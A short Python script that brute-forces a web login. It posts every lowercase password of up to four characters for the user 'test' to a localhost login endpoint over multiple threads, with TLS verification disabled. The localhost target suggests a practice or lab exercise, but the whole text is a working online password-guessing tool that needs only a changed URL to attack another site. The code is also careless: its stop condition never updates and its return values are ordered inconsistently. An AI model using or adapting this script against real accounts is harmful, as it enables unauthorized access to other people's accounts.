import itertools
import string
import requests
from timeit import default_timer as timer
import threading

session = requests.Session()
def parallel_brute_force(length, start, guess , attempts):
    chars = string.ascii_lowercase
    attempts = 0
    for guess in itertools.product(chars, repeat=length):
        attempts += 1
        guess = ''.join(guess)
        if len(guess) == 4:
            print(f"Tryng {guess}")
        url = "https://localhost:9443/login"
        body = {'username':'test', 'password': guess}
        resp = session.post(url, json=body, verify=False)
        if resp.status_code == 200:
             print(f"Password cracked in {attempts} attempts. The password is {guess}.")
             end = timer()
             print(f"Time elapsed {end - start}")
             return (guess, attempts)
    return (attempts, None)

start = timer()
listThreads = [None] * 8
guess = ""
attempts = 0
for l in range(0, 4):
    listThreads[l] = threading.Thread(target=parallel_brute_force,args=(l+1,start, guess, attempts))
    listThreads[l].start()

for i in range(0,4):
    if guess:
     break
    listThreads[i].join()